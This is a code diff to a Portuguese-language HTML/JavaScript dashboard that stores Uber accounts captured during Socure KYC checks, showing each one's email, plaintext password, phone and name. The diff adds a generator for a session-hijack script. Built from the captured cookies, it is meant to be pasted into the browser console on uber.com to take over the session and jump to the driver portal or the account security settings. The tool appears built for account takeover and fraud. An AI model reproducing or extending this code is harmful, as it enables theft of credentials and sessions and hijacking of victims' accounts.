@@ -98,8 +98,8 @@
     table.accounts-table tr:hover td { background: #f9fafb; }
     .acc-actions { display: flex; gap: 6px; flex-wrap: wrap; }
     .acc-btn { border: none; border-radius: 6px; padding: 4px 10px; font-size: 11px; font-weight: 700; cursor: pointer; transition: all .15s; white-space: nowrap; margin-bottom: 0; width: auto; }
-    .acc-btn-cookies  { background: #dbeafe; color: #1d4ed8; }
-    .acc-btn-cookies:hover  { background: #bfdbfe; }
+    .acc-btn-script   { background: #dbeafe; color: #1d4ed8; }
+    .acc-btn-script:hover   { background: #bfdbfe; }
     .acc-btn-security { background: #d1fae5; color: #065f46; }
     .acc-btn-security:hover { background: #a7f3d0; }
     .acc-btn-copy     { background: #e0e7ff; color: #3730a3; }
@@ -205,6 +205,10 @@
         <h2>🛡️ Contas Socure Salvas</h2>
         <span id="accountsCount" class="accounts-count">0 contas</span>
       </div>
+      <p style="font-size:12px;color:#6b7280;margin-bottom:12px;">
+        💡 <strong>Como usar:</strong> clique em <strong>📋 Copiar Script</strong> → abra uma guia em <code>uber.com</code> → F12 → Console → cole e Enter.<br>
+        Para ir direto às configurações de segurança, clique em <strong>⚙️ Script Segurança</strong> e cole no console da mesma forma.
+      </p>
       <div class="accounts-table-wrap">
         <table class="accounts-table">
           <thead>
@@ -215,13 +219,12 @@
               <th>Telefone</th>
               <th>Nome</th>
               <th>KYC</th>
-              <th>Score</th>
               <th>Salvo em</th>
               <th>Ações</th>
             </tr>
           </thead>
           <tbody id="accountsBody">
-            <tr><td colspan="9" class="acc-empty">Nenhuma conta salva ainda. As contas aparecem aqui quando o KYC Socure é detectado.</td></tr>
+            <tr><td colspan="8" class="acc-empty">Nenhuma conta salva ainda. As contas aparecem aqui quando o KYC Socure é detectado.</td></tr>
           </tbody>
         </table>
       </div>
@@ -362,30 +365,75 @@
       });
     }
 
-    // ─── Account actions ──────────────────────────────────────────────────────
-    function accountAction(id, action, btnEl, feedbackEl) {
-      if (btnEl.classList.contains('loading')) return;
-      btnEl.classList.add('loading');
-      feedbackEl.className = 'acc-feedback';
-      feedbackEl.textContent = '';
-
-      fetch('/api/accounts/' + id + '/' + action, {
-        method: 'POST',
-        headers: authHeaders(),
-      })
-      .then(function(r) { return r.json(); })
-      .then(function(data) {
-        btnEl.classList.remove('loading');
-        feedbackEl.className = 'acc-feedback ' + (data.ok ? 'ok' : 'err');
-        feedbackEl.textContent = data.ok ? (data.message || '✅ Feito!') : ('❌ ' + (data.error || 'Erro'));
-        setTimeout(function() { feedbackEl.className = 'acc-feedback'; }, 4000);
-      })
-      .catch(function(e) {
-        btnEl.classList.remove('loading');
-        feedbackEl.className = 'acc-feedback err';
-        feedbackEl.textContent = '❌ Erro de rede: ' + e.message;
-        setTimeout(function() { feedbackEl.className = 'acc-feedback'; }, 4000);
+    // ─── Gera o script de injeção de cookies (formato userscript) ─────────────
+    // redirectUrl: se passado, o script redireciona para essa URL ao fim
+    function buildCookieScript(cookies, redirectUrl) {
+      // Converte cookies do Playwright para o formato [name, value, domain, secure, httpOnly, expires]
+      // expires do Playwright já é timestamp em segundos; multiplicamos por 1000 para ms (igual ao script original)
+      var arr = cookies.map(function(c) {
+        var expiresMs = c.expires > 0 ? Math.round(c.expires * 1000) : -1;
+        return [
+          c.name,
+          c.value,
+          c.domain,
+          c.secure ? 1 : 0,
+          c.httpOnly ? 1 : 0,
+          expiresMs
+        ];
       });
+
+      var cookieArrayStr = JSON.stringify(arr, null, 0);
+
+      var redirectBlock = redirectUrl
+        ? 'var RAN="__scr_done";if(!sessionStorage.getItem(RAN)){sessionStorage.setItem(RAN,"1");setTimeout(function(){location.href=' + JSON.stringify(redirectUrl) + ';},800);}'
+        : 'var RAN="__scr_done";if(!sessionStorage.getItem(RAN)&&location.href.indexOf("drivers.uber.com")<0){sessionStorage.setItem(RAN,"1");setTimeout(function(){location.href="https://drivers.uber.com/";},800);}';
+
+      return '(function(){' +
+        'var H=window.location.hostname,' +
+        'C=' + cookieArrayStr + ';' +
+        'var ok=function(d){d=d.replace(/^[.]/,"");return H===d||H.endsWith("."+d)};' +
+        'var EX=Date.now()+3154e7;' +
+        'C.forEach(function(c){' +
+          'var n=c[0],v=c[1],d=c[2],s=c[3],h=c[4],e=c[5]>0?c[5]:EX;' +
+          'if(typeof GM_cookie!="undefined")GM_cookie.set({name:n,value:v,domain:d.replace(/^[.]/,""),path:"/",secure:!!s,httpOnly:!!h,expirationDate:Math.floor(e/1000)},function(){});' +
+          'if(!h&&ok(d)){' +
+            'var ck=n+"="+v+";path=/;expires="+new Date(e).toUTCString()+(s?";secure":"")+"";' +
+            'try{document.cookie=ck;}catch(x){}' +
+            'if(typeof cookieStore!="undefined")cookieStore.set({name:n,value:v,domain:location.hostname,path:"/",expires:e}).catch(function(){});' +
+          '}' +
+        '});' +
+        redirectBlock +
+      '})()';
+    }
+
+    // ─── Botão: copiar script de cookies (redireciona para drivers.uber.com) ──
+    function copyScriptLogin(acc, btnEl, feedbackEl) {
+      if (!acc.cookies || acc.cookies.length === 0) {
+        feedbackEl.className = 'acc-feedback err';
+        feedbackEl.textContent = '❌ Sem cookies salvos';
+        setTimeout(function() { feedbackEl.className = 'acc-feedback'; }, 3000);
+        return;
+      }
+      var script = buildCookieScript(acc.cookies, null);
+      copyText(script, btnEl);
+      feedbackEl.className = 'acc-feedback ok';
+      feedbackEl.textContent = '✅ Script copiado! Cole no console do browser em uber.com';
+      setTimeout(function() { feedbackEl.className = 'acc-feedback'; }, 4000);
+    }
+
+    // ─── Botão: copiar script que redireciona para account.uber.com/security ──
+    function copyScriptSecurity(acc, btnEl, feedbackEl) {
+      if (!acc.cookies || acc.cookies.length === 0) {
+        feedbackEl.className = 'acc-feedback err';
+        feedbackEl.textContent = '❌ Sem cookies salvos';
+        setTimeout(function() { feedbackEl.className = 'acc-feedback'; }, 3000);
+        return;
+      }
+      var script = buildCookieScript(acc.cookies, 'https://account.uber.com/security');
+      copyText(script, btnEl);
+      feedbackEl.className = 'acc-feedback ok';
+      feedbackEl.textContent = '✅ Script copiado! Cole no console em qualquer guia uber.com';
+      setTimeout(function() { feedbackEl.className = 'acc-feedback'; }, 4000);
     }
 
     // ─── API calls ────────────────────────────────────────────────────────────
@@ -502,17 +550,21 @@
     }
 
     // ─── Render: Accounts ─────────────────────────────────────────────────────
+    // Guarda as contas em memória para os botões acessarem os cookies
+    var _accountsCache = [];
+
     function renderAccounts(accounts) {
-      var hash = accounts.length + (accounts[0] ? accounts[0].id : '');
+      var hash = accounts.length + (accounts[0] ? accounts[0].id : '') + (accounts[accounts.length-1] ? accounts[accounts.length-1].id : '');
       if (hash === _lastAccountsHash) return;
       _lastAccountsHash = hash;
+      _accountsCache = accounts;
 
       document.getElementById('accountsCount').textContent =
         accounts.length + (accounts.length === 1 ? ' conta' : ' contas');
 
       if (accounts.length === 0) {
         document.getElementById('accountsBody').innerHTML =
-          '<tr><td colspan="9" class="acc-empty">Nenhuma conta salva ainda. As contas aparecem aqui quando o KYC Socure é detectado.</td></tr>';
+          '<tr><td colspan="8" class="acc-empty">Nenhuma conta salva ainda. As contas aparecem aqui quando o KYC Socure é detectado.</td></tr>';
         return;
       }
 
@@ -523,7 +575,8 @@
         var nomeCompleto = ((acc.nome || '') + ' ' + (acc.sobrenome || '')).trim() || '-';
         var hasCookies = acc.cookies && acc.cookies.length > 0;
         var cookieCount = hasCookies ? acc.cookies.length : 0;
-        var rowId = 'acc-' + acc.id.replace(/-/g,'');
+        var feedbackId = 'acc-fb-' + i;
+        var idx = i; // índice para referenciar _accountsCache
 
         html += '<tr>' +
           '<td>' + (i + 1) + '</td>' +
@@ -532,25 +585,29 @@
             ' <button class="acc-btn acc-btn-copy" onclick="copyText(' + JSON.stringify(acc.email || '') + ', this)">📋</button>' +
           '</td>' +
           '<td>' +
-            (acc.senha ? '<span style="font-family:monospace">' + escHtml(acc.senha) + '</span> <button class="acc-btn acc-btn-copy" onclick="copyText(' + JSON.stringify(acc.senha || '') + ', this)">📋</button>' : '-') +
+            (acc.senha
+              ? '<span style="font-family:monospace">' + escHtml(acc.senha) + '</span> <button class="acc-btn acc-btn-copy" onclick="copyText(' + JSON.stringify(acc.senha || '') + ', this)">📋</button>'
+              : '-') +
           '</td>' +
           '<td>' + escHtml(acc.telefone || '-') + '</td>' +
           '<td>' + escHtml(nomeCompleto) + '</td>' +
           '<td><span class="acc-kyc-badge">' + escHtml(acc.provider || 'Socure') + '</span></td>' +
-          '<td></td>' +
           '<td style="white-space:nowrap;font-size:11px;color:#9ca3af">' + escHtml(savedAt) + '</td>' +
           '<td>' +
             '<div class="acc-actions">' +
-              '<button class="acc-btn acc-btn-cookies" ' + (hasCookies ? '' : 'disabled title="Sem cookies"') +
-                ' onclick="accountAction(\'' + acc.id + '\', \'inject-cookies\', this, document.getElementById(\'' + rowId + '\'))">' +
-                '🍪 Injetar Cookies' + (hasCookies ? ' (' + cookieCount + ')' : '') +
+
+              // Botão 1: Copiar script de login (redireciona para drivers.uber.com)
+              '<button class="acc-btn acc-btn-script"' + (hasCookies ? '' : ' disabled title="Sem cookies"') + ' onclick="copyScriptLogin(_accountsCache[' + idx + '], this, document.getElementById(\'' + feedbackId + '\'))">' +
+                '📋 Copiar Script' + (hasCookies ? ' (' + cookieCount + ')' : '') +
               '</button>' +
-              '<button class="acc-btn acc-btn-security" ' + (hasCookies ? '' : 'disabled title="Sem cookies"') +
-                ' onclick="accountAction(\'' + acc.id + '\', \'open-security\', this, document.getElementById(\'' + rowId + '\'))">' +
-                '⚙️ Abrir Configurações' +
+
+              // Botão 2: Copiar script que vai para account.uber.com/security
+              '<button class="acc-btn acc-btn-security"' + (hasCookies ? '' : ' disabled title="Sem cookies"') + ' onclick="copyScriptSecurity(_accountsCache[' + idx + '], this, document.getElementById(\'' + feedbackId + '\'))">' +
+                '⚙️ Script Segurança' +
               '</button>' +
+
             '</div>' +
-            '<div id="' + rowId + '" class="acc-feedback"></div>' +
+            '<div id="' + feedbackId + '" class="acc-feedback"></div>' +
           '</td>' +
           '</tr>';
       }
